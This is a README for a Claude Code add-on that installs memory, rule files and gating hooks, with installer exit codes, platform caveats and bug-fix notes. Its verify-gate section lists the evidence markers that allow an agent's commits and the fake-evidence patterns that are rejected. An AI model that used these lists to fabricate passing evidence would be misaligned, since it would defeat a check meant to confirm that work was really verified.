| 13 | Native Windows / Cygwin / MSYS2 / MinGW / WSL1 |
| 14 | Sandboxed Claude Code (Snap / Flatpak) |
| 15 | `~/.claude/` is on a network filesystem (NFS / CIFS / SMB / sshfs) |
| 16 | Python sqlite3 lacks FTS5 support |
| 20 | Backup failed |
| 30 | Write failed (rolled back) |
| 40 | `settings.json` merge failed (rolled back) |
| 130 | User interrupted (rolled back) |

---

## How it actually works

**Memory engine.** `rolling_memory.py` is a SQLite + FTS5 store with a typed schema (`directive`, `feedback`, `project_context`, `consilium`, `audit`, `error_lesson`, ...), preserve flags, per-project scope, and age-based consolidation. The `SessionStart` hook injects a token-budgeted slice of relevant rows into the conversation. `/start` surfaces cross-project rows via FTS5 with category-biased ranking.

**Rule loading.** Claude Code auto-loads `~/.claude/rules/*.md`. Each file has frontmatter: `paths:` globs for conditional loading (e.g. `*.tsx` files load `frontend-debug.md` only), `description:` for gated loading, or no gate for always-on. Result: 10× less bloat than a monolithic `CLAUDE.md`.

**Session lifecycle.**
- **SessionStart** hook: budgeted memory injection + model balancer daily decision.
- **UserPromptSubmit** hook: phase prompt injection + compact advisor.
- **PreToolUse** on Agent: `go_gate.py` enforces тройка pipeline — blocks coding Agent spawns during IMPLEMENT without active `/go`. `delegate_gate.py` enforces Lead-as-orchestrator pattern (budget on direct tool calls, resets on delegation).
- **PreToolUse** on Bash: `verify_gate.py` scans the last 200 transcript lines for an evidence JSON block before allowing `git commit` on handover files.
- **PostToolUse**: batches events into `memory_batch_<session>.jsonl` for the session-end extractor + model metric capture for balancer.
- **Stop**: 3-question smart extraction + error-lesson classification (11-slug taxonomy) → promotes recurring patterns into `institutional.md`.

**Auto-consilium.** `core.md` defines HIGH risk as "change hits 2+ of: production data, auth/security, infrastructure, multi-service, financial logic, irreversible side effects". When triggered, Claude spawns 3-5 bio-specific agents (architect, security, devops, product, ...) + GPT via Codex/PAL, synthesizes positions, saves to `reports/consilium_*.md`. Index picks it up.

**Тройка enforcement.** Every coding delegation during IMPLEMENT phase must go through the `/go` pipeline: Flow Designer → Worker + Verifier. `go_gate.py` (PreToolUse on Agent) physically blocks non-compliant spawns. `delegate_gate.py` enforces the Lead-as-orchestrator pattern — Lead delegates via agents, doesn't code inline.

**Session context injection.** On retry (Worker failure classified as W/V/A/E), Lead includes the failed agent's session in the new Worker's brief via `session_context.py`. The tool reads Claude Code's JSONL session files — both Lead sessions and subagent sessions stored in `<session-id>/subagents/`. Preserves code edits (Edit/Write diffs), Bash commands + output, and dialogue. Strips hook noise, permission modes, file-history snapshots. Decision rules in `paired-verification.md` §Session context injection specify whose context to pass (Lead's vs. failed agent's) based on the trigger type.

**Verify-gate.** PreToolUse-blocks handover commits unless the last 200 lines contain `{"verified": {"status": "pass"|"na", "evidence": [...]}}`. Accepts markers: `curl`, `psql`, `sqlite3`, `HTTP/`, `docker`, `kubectl`, `DevTools`, `pytest`, `exit=<N>`. Rejects fake-evidence patterns: `localhost`, `|| true`, `curl -s` without `--fail`.

---

## Idempotency

Running `install.py` twice = zero writes the second time. Files are compared post-substitution against SHA-256 of what the installer *would* write. `--dry-run` after a successful install shows an empty plan.

---

## Customization at install time

`{{GIT_AUTHOR_NAME}}` and `{{GIT_AUTHOR_EMAIL}}` placeholders in rule templates are replaced at install time with the values you pass via `--name/--email` (or prompt, or read from `git config --global`).

Hook commands in `settings.json` are pinned to absolute paths: `${CLAUDE_HOME}` → your `~/.claude/`, `${PYTHON}` → `shutil.which("python3")` (stable through Homebrew / apt / pyenv version changes). No runtime shell-var resolution, no broken hooks after `brew upgrade python`.

---

## What's NOT shipped (on purpose)

- Your `rolling_memory.db` — per-user, bootstraps empty on first use.
- Your consilium/audit reports — those live in each project's `reports/`.
- Per-project `~/.claude/projects/*/memory/` markdown — per-project, per-user.
- `pyyaml` — only `scripts/index_reports.py` uses it. `pip install -r requirements.txt` if you use `/start` cross-project indexing.

---

## Project layout

```
claude-booster/
├── install.py                # stdlib-only installer (~900 LOC)
├── requirements.txt          # pyyaml (runtime dep for index_reports.py)
├── .gitignore                # excludes all per-user runtime data
├── templates/
│   ├── rules/                # 12 .md files
│   ├── scripts/              # 25+ .py/.sh files
│   ├── commands/             # 13 slash commands
│   ├── agents/               # 5 protocol files + 2 JSON schemas
│   └── settings.json.template
├── docs/
│   ├── audit_fix_validation.md
│   └── audit_secrets_scan.md
└── README.md
```

---

## Design decisions

Key tradeoffs:

- **Python-stdlib only** for the installer. No pip at install time.
- **Namespaced `settings.json` merge** via `source: "booster@<ver>"` tags — not deep merge. User's hooks, MCP servers with auth tokens, and permission lists survive untouched.
- **DB migration punted**: `rolling_memory.py` auto-initializes an empty v5 DB on first call. Migration across Booster versions on the same machine is deferred to v2.
- **Windows deferred to v2**: `fcntl`, case-sensitivity, cmd-dispatched hooks, JSON backslash escaping, and MAX_PATH all need separate handling.
- **Audit trail**: `docs/audit_fix_validation.md` and `docs/audit_secrets_scan.md` document the 2 independent reviews this release went through.

---

## Known caveats

**Supported:**
- macOS (Apple Silicon + Intel) with Homebrew Python 3.8+
- Ubuntu / Debian / Fedora / Arch / Alpine with system or apt/dnf/pacman Python 3.8+
- WSL2 — with the Desktop caveat below

**Refused at preflight (with actionable error):**
- Native Windows, Cygwin, MSYS2, MinGW (exit 13) — use WSL2
- WSL1 (exit 13) — drvfs corrupts SQLite WAL; upgrade via `wsl --set-version <distro> 2`
- Snap / Flatpak sandboxed Claude Code (exit 14) — app-HOME differs from `$HOME`
- `~/.claude/` on NFS / CIFS / SMB / sshfs / 9p (exit 15) — SQLite WAL forbidden
- Python sqlite3 without FTS5 (exit 16) — install Homebrew/apt/dnf Python

**Known caveats (not blocked; user must understand):**

1. **WSL2 + Claude Code Desktop on Windows host**: Desktop reads `%USERPROFILE%\.claude` on Windows, NOT the WSL home. Install on the side where Claude Code actually runs. Installer warns at preflight.
2. **`brew upgrade python`**: the resolved `python3` path from `shutil.which()` survives minor upgrades (Homebrew keeps a stable symlink). If you switch Python major versions or uninstall the symlinked version, re-run `install.py --yes`.
3. **NixOS**: `/usr/bin/env python3` is used via PATH — a `nixos-rebuild switch` that drops your Python derivation will break hooks; re-run install.
4. **Intel → Apple Silicon Mac migration**: paths differ (`/usr/local/bin/python3` vs `/opt/homebrew/bin/python3`); re-run install after migration.
5. **Devcontainers**: `~/.claude/` is wiped on rebuild unless mounted as a volume. Add `source=~/.claude,target=/root/.claude,type=bind` to `devcontainer.json`.
6. **External drive unmount mid-install**: the backup is staged in `$TMPDIR` (local tmpfs), so rollback still works even if `~/.claude/` lives on a drive that disappears.
7. **FileVault + power-loss**: on macOS we additionally call `F_FULLFSYNC` for each atomic write (platter flush, not just OS buffer) — reduces but does not eliminate the corruption window.

**Recently fixed:**

- **`/start` no longer triggers a zsh `nomatch` cascade in projects without `roadmap.html`/`roadmap.md`** (2026-04-25). On macOS Claude Code defaults to zsh, where `nomatch` is on: a glob like `ls roadmap.* 2>/dev/null` aborts at parse time **before** the redirect applies, so `2>/dev/null` cannot suppress it. Compounding this, the Claude Code harness cancels **every sibling tool call** in a parallel-tool-call block when any one exits non-zero — so one stray glob in `/start` recon could void the rules-canary, telemetry, tag-hygiene, and rolling-memory probes in a single shot. Fix: `templates/rules/commands.md` now instructs Claude to use the `Read` tool for `roadmap.{html,md}` existence probes (clean per-tool error, no sibling cancellation), and `templates/rules/core.md` ships a new `# [CRITICAL] Shell hygiene` section with `(N)` qualifier + explicit-enumeration patterns for unavoidable Bash globs. New installs pick this up automatically; existing installs need `python3 install.py --yes` to re-apply.
- **`delegate_gate` no longer treats `$HOME` as a project root** (2026-04-25). Previously, launching Claude from the home directory (or any non-project dir) caused `project_root_from()` to match `~/.claude/` (the global config dir) as a project marker. The delegate-budget counter was then written to `~/.claude/.delegate_counter` and shared across every non-project session, so the very first `Bash`/`Edit` call could be blocked with "budget exhausted (2/1)". Fix: `_gate_common.project_root_from()` now excludes the `~/.claude/` marker when the candidate path equals `Path.home()` (a real `.git/` at HOME is still respected); `delegate_gate.main()` adds a defense-in-depth early-exit when `root == Path.home()`, logging `decision=allow / reason="no project context"`.

**Out of scope (v2):**
- Native Windows support (requires `fcntl`→`msvcrt`, cmd-dispatched hooks, case-insensitive FS handling, `\\?\` long paths).
- `uninstall.py` (use manifest to selectively revert).
- Interactive `settings.json` conflict resolver.
- `booster doctor` diagnostic command.

---

## License

MIT.
